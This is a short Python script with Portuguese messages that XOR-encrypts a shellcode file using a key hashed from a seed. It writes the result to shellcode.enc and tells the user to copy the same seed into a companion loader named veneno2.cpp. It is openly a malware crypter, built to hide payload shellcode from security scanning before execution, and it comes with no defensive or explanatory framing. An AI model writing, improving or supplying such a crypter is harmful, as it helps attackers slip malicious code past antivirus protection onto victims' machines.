import sys

def derive_key(seed: str, n: int = 32) -> bytes:
    key = bytearray()
    h = 0xcbf29ce484222325
    for c in seed.encode():
        h ^= c
        h = (h * 0x100000001b3) & 0xFFFFFFFFFFFFFFFF
        key.append(h & 0xFF)
        if len(key) >= n:
            break
    return bytes(key)

def encrypt(data: bytes, key: bytes) -> bytes:
    out = bytearray()
    for i, b in enumerate(data):
        out.append(b ^ key[i % len(key)] ^ (i & 0xFF))
    return bytes(out)

if len(sys.argv) < 3:
    print("Uso: python3 encrypt2.py shellcode.bin <seed>")
    sys.exit()

seed = sys.argv[2]
key = derive_key(seed)
data = open(sys.argv[1], "rb").read()
enc = encrypt(data, key)

with open("shellcode.enc", "wb") as f:
    f.write(enc)

print("[+] shellcode.enc gerado com seed:", seed)
print("[+] Cole a MESMA seed no veneno2.cpp (constante SEED)")
